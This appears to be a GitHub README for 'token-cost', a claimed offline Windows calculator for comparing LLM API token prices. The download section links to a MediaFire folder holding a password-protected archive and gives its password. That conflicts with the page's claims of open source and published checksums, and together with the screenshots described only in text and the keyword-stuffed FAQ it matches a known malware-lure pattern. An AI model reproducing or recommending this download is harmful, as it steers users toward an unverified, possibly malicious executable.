# token-cost

💰 Free, open-source API cost calculator for Windows — compare token prices across models, plan budgets offline. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Price table included** — current per-million-token rates for the major hosted models, editable when they change
- ✅ **Paste and count** — drop any text or transcript and see the token count and cost per model instantly
- ✅ **Conversation simulator** — model a chat with turn counts and growing context to find the real monthly bill
- ✅ **Batch comparison** — a CSV of planned prompts priced across twenty models side by side
- ✅ **Budget tracker** — set a monthly ceiling and watch where the planned workload lands against it
- ✅ **Export quotes** — a clean table for proposals and internal approvals, not a screenshot
- ✅ **100 MB self-contained exe** — runtime bundled, prices stored locally, fully offline, MIT

## Why token-cost

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **token-cost** | Provider dashboards | Online calculators | Spreadsheets |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Included with API | Free web | Free |
| Open source | **Yes** | No | No | N/A
| Cross-provider comparison | **Yes** | One provider only | Partial | Manual
| Conversation and context simulation | **Yes** | No | Partial | No
| Batch CSV pricing | **Yes** | No | No | Scripted
| Portable, no install | **Yes, 100 MB** | Browser | Browser | App

## FAQ

**how much will my LLM API usage cost? compare token prices offline**

Provider dashboards show what you already spent and cannot compare rivals, while online calculators forget that context grows every turn. token-cost prices pasted text and simulated conversations across all major models with an editable rate table. It is a 100 MB portable exe, MIT, and works offline with your data.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark ledger (#121418, gold #CA8A04): pasted transcript left with token count, model price table right with twenty rows sorted by monthly cost, cheapest row highlighted.
2. Conversation simulator: turn count stepper at 40, average reply slider, growing context chart, projection card reading 312 dollars per month.
3. Budget view: ceiling field at 500 dollars, workload bars per model against it, warnings in amber on two models, export quote button.

## Download

| Source | Link |
|---|---|
| 💾 **Installer token-cost** | [Installer token-cost](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).